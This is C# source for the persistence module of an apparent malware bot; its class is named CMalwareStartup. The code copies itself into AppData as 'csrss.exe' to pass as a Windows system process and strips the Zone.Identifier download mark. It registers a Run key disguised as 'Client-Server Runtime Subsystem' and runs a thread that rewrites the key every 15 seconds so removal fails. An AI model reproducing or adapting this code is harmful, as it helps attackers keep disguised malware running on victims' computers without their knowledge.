using System;
using System.IO;
using Microsoft.Win32;
using Stub.Utilities;
using System.Diagnostics;
using System.Windows.Forms;
using System.Threading;
using Stub.Core.Modules.Process_Protection;
using Stub.WinAPI;

namespace Stub.Core.Modules.Startup
{
    class CMalwareStartup
    {
        const String strFileName = "csrss.exe";
        const String strRegistryName = "Client-Server Runtime Subsystem";
        static bool bRegistryPersistance = true;
        public static Boolean InstallBot()
        {
            try
            {
                String strDropPath = CUtils.GetAppData();

                if (String.IsNullOrEmpty(strDropPath)) return false;

                String strMainPath = CUtils.GetMainPath();

                if (String.IsNullOrEmpty(strMainPath)) return false;

                strDropPath += strFileName;

                if (strDropPath == strMainPath)
                {
                    new Thread(delegate()
                        {
                            while (bRegistryPersistance)
                            {
                                CRegistry.SetRegValue(CUtils.IsElevated() ? Registry.LocalMachine : Registry.CurrentUser, @"Software\Microsoft\Windows\CurrentVersion\Run", strRegistryName, strDropPath);

                                DateTime dtNextAdd = DateTime.Now.AddSeconds(15);

                                while (dtNextAdd > DateTime.Now && bRegistryPersistance)
                                    Thread.Sleep(10);
                            }
                        }).Start();
                    return true;
                }

                File.Copy(strMainPath, strDropPath, true);

                CKernel32.DeleteFile(
                    string.Format(
                    "{0}:Zone.Identifier",
                    strDropPath)
                    );

                if (CRegistry.SetRegValue(CUtils.IsElevated() ? Registry.LocalMachine : Registry.CurrentUser, @"Software\Microsoft\Windows\CurrentVersion\Run", strRegistryName, strDropPath))
                {
                    Process.Start(strDropPath);
                }
            }
            catch { }

            Application.Exit();
            
            return false;
        }

        public static bool UninstallBot()
        {
#if !DEBUG
            if (!CRegistry.DeleteRegValue(CUtils.IsElevated() ? Registry.LocalMachine : Registry.CurrentUser, @"Software\Microsoft\Windows\CurrentVersion\Run", strRegistryName))
                return false;
#endif
            if (!CProcessProtection.ProtectProcess(false))
                return false;

            bRegistryPersistance = false;
            return true;
        }
    }
}
